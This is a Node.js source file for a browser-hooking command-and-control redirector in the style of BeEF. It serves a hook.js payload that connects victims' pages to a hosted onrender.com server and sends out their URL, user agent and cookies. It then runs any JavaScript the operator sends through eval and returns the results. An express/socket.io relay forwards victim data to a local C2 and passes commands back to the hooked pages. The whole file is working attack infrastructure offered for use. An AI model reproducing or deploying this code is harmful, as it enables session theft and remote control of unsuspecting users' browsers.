const express = require('express');
const { Server } = require('socket.io');
const http = require('http');

const app = express();
const server = http.createServer(app);
// Allow CORS for the socket so victims can connect from any domain
const io = new Server(server, { cors: { origin: '*' } });

let localC2Socket = null;

// The static hook payload
const cachedHook = `
    console.log("[Render Proxy] Hook loaded. Connecting to proxy...");
    const s = document.createElement('script');
    s.src = 'https://beef-c2-api-deploy-2.onrender.com/socket.io/socket.io.js';
    document.head.appendChild(s);
    s.onload = () => {
        window.c2socket = io('https://beef-c2-api-deploy-2.onrender.com');
        
        window.c2socket.on('connect', () => {
            console.log("[Render Proxy] Connected to C2 proxy.");
            window.c2socket.emit('victim_register', {
                url: window.location.href,
                userAgent: navigator.userAgent,
                cookies: document.cookie
            });
        });

        // Listen for commands
        window.c2socket.on('execute', (cmd) => {
            try {
                const result = eval(cmd);
                window.c2socket.emit('victim_result', { success: true, result: String(result) });
            } catch(e) {
                window.c2socket.emit('victim_result', { success: false, error: e.message });
            }
        });
    };
`;

app.get('/hook.js', (req, res) => {
    res.type('application/javascript');
    res.send(cachedHook);
});

app.get('/', (req, res) => {
    res.send('Redirector is online.');
});

io.on('connection', (socket) => {
    
    // Identification
    socket.on('identify', (role) => {
        if (role === 'local_c2') {
            localC2Socket = socket;
            console.log('Local Team Server (C2) connected securely!');
        }
    });

    // --- FROM VICTIM TO PROXY ---
    socket.on('victim_register', (data) => {
        if (localC2Socket) {
            localC2Socket.emit('victim_register', { id: socket.id, data });
        } else {
            console.log('Victim hooked, but Local C2 is offline. Tracking silently.');
        }
    });

    socket.on('victim_result', (data) => {
        if (localC2Socket) {
            localC2Socket.emit('victim_result', { id: socket.id, data });
        }
    });

    // --- FROM LOCAL C2 TO PROXY ---
    socket.on('admin_execute', ({ target, cmd }) => {
        if (socket === localC2Socket) {
            io.to(target).emit('execute', cmd);
        }
    });

    socket.on('disconnect', () => {
        if (socket === localC2Socket) {
            localC2Socket = null;
            console.log('Local Team Server (C2) went offline.');
        } else {
            if (localC2Socket) {
                localC2Socket.emit('victim_disconnect', socket.id);
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Render Redirector running on port ${PORT}`);
});
